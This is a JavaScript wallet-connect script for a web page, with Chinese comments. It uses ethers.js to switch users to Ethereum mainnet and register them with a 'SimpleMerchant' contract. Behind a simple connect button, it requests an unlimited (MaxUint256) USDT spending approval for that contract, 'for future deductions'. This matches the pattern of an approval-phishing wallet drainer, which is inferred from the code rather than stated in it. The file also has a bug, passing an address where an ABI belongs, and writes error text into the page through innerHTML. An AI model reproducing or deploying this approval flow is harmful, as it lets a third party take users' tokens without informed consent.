const ETHEREUM_CONTRACT_ADDRESS = '0x3df02b3b38c6b55725795db9c50b649c204f2dad';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT 主網地址
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // 檢查網絡並切換到主網
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n 是主網的 Chain ID
            updateStatus('正在切換到以太坊主網...');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }] // '0x1' 是主網的十六進制 Chain ID
                });
                // 切換成功後，重新獲取 provider 和 network
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork(); // 再次確認網絡
            } catch (switchError) {
                if (switchError.code === 4902) { // 4902 表示網絡不存在，可能需要添加
                    updateStatus('以太坊主網未添加，請手動添加或確認。');
                } else if (switchError.code === 4001) { // 4001 表示用戶拒絕
                    updateStatus('用戶拒絕切換網絡。請手動切換到以太坊主網。');
                } else {
                    updateStatus(`切換網絡失敗：${switchError.message}`);
                }
                return; // 如果切換失敗，停止後續操作
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 修正：使用 signer 初始化
            
            await checkAuthorization(); // 檢查授權狀態
            updateStatus('已恢復連繫狀態');
        } else {
            updateStatus('請連繫錢包');
        }

        // 監聽帳戶變更事件
        window.ethereum.on('accountsChanged', async (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('錢包已斷開連繫');
            } else {
                userAddress = accounts[0];
                signer = await provider.getSigner();
                contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, signer); // 修正：使用 signer 初始化
                await checkAuthorization();
            }
        });

        // 監聽網絡變更事件
        window.ethereum.on('chainChanged', () => {
            resetState();
            updateStatus('網絡已切換，請重新連繫錢包');
            window.location.reload(); // 建議重新載入頁面以確保 ethers.js 環境正確
        });

    } catch (error) {
        updateStatus(`初始化失敗：${error.message}`);
        console.error("Initialize Wallet Error:", error);
    }
}

async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract) {
            // 如果還沒有初始化完成，則不執行檢查
            return;
        }

        const isAuthorized = await contract.authorized(userAddress);
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

        let statusMessage = '';

        if (isAuthorized) {
            statusMessage += 'SimpleMerchant 合約已授權。';
        } else {
            statusMessage += 'SimpleMerchant 合約未授權。';
        }

        // 無論 USDT 餘額多少，都顯示授權狀態
        statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}。`;
        if (usdtAllowance > 0n) {
            statusMessage += `USDT 已授權: ${ethers.formatUnits(usdtAllowance, 6)}。`;
        } else {
            statusMessage += `USDT 未授權或授權為零。`;
        }
        
        // 判斷連繫按鈕的狀態：只要 SimpleMerchant 合約已授權，並且 USDT 已授權 (或根本沒有 USDT 餘額)
        const allAuthorized = isAuthorized && (usdtAllowance > 0n);

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = '斷開錢包';
            connectButton.disabled = false;
            updateStatus(`已連繫並完成所有授權。${statusMessage}`);
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = '連繫錢包';
            connectButton.disabled = false;
            updateStatus(`請連繫錢包並完成所有授權。${statusMessage}`);
        }
    } catch (error) {
        updateStatus(`檢查授權失敗：${error.message}`);
        console.error("Check Authorization Error:", error);
    }
}


async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }

        // 請求連接錢包 (會彈出 MetaMask)
        await provider.send('eth_requestAccounts', []);
        
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 確保這裡使用 signer

        // 檢查 ETH 餘額 (用於支付 Gas Fee)
        const ethBalance = await provider.getBalance(userAddress);
        const requiredEthForGas = ethers.parseEther('0.001'); // 設定一個僅夠支付 Gas Fee 的最低 ETH 要求
        if (ethBalance < requiredEthForGas) {
            updateStatus(`警告：ETH 餘額可能不足以支付授權交易的 Gas Fee (建議至少 ${ethers.formatEther(requiredEthForGas)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。`);
            // 不阻斷，但給予警告
        } else {
            updateStatus('ETH 餘額充足，可以進行授權。');
        }

        // 1. 檢查並執行 SimpleMerchant 合約授權 (connectAndAuthorize)
        const isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
            updateStatus('正在授權 SimpleMerchant 合約...');
            const txAuthorize = await contract.connectAndAuthorize();
            await txAuthorize.wait();
            updateStatus('SimpleMerchant 合約授權成功。');
        } else {
            updateStatus('SimpleMerchant 合約已授權。');
        }

        // 2. 檢查並執行 USDT 代幣授權 (approve)
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        
        // 無論 USDT 餘額多少，只要授權不足 MaxUint256 或為零，就嘗試重新授權
        // 這裡判斷只要不是 MaxUint256，就認為需要重新授權，以確保未來的扣款彈性
        const maxAllowance = ethers.MaxUint256;
        if (usdtAllowance < maxAllowance) {
            updateStatus('正在授權 USDT 代幣 (MaxUint256)...');
            // 注意：許多錢包在 approve(address, amount) amount 為 0 且目標為 0x0 時會阻止
            // 因此，如果當前 allowance 不為 0 但小於 MaxUint256，可能需要先發送一個 0 的 approve 交易
            // 然後再發送 MaxUint256 的 approve 交易，以避免某些代幣的 approve 函數限制
            // 為了簡化，這裡直接嘗試發送 MaxUint256，如果失敗會拋出錯誤
            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            await txApprove.wait();
            updateStatus('USDT 代幣授權成功 (已設為 MaxUint256)。');
        } else {
            updateStatus('USDT 代幣已授權足夠金額 (MaxUint256)。');
        }
        
        connectButton.classList.add('connected');
        connectButton.title = '斷開錢包';
        connectButton.disabled = false;
        updateStatus('連繫並完成所有必要授權。');
    } catch (error) {
        updateStatus(`操作失敗：${error.message}`);
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        connectButton.disabled = false;
    }
}

function disconnectWallet() {
    resetState();
    updateStatus('錢包已斷開連繫，請重新連繫。');
    // 提示用戶在 MetaMask 中手動斷開（Ethers.js v6 不提供直接斷開功能）
    alert('錢包已斷開連繫。若需完全斷開本網站與 MetaMask 的連繫，請在 MetaMask 的「已連繫網站」中手動移除本網站。');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = '連繫錢包';
    connectButton.disabled = false;
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>狀態：</strong> ${message}`;
}

// 監聽連接按鈕點擊事件
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

// 頁面載入時初始化錢包狀態
initializeWallet();
console.log('connectButton event listener added and initializeWallet called');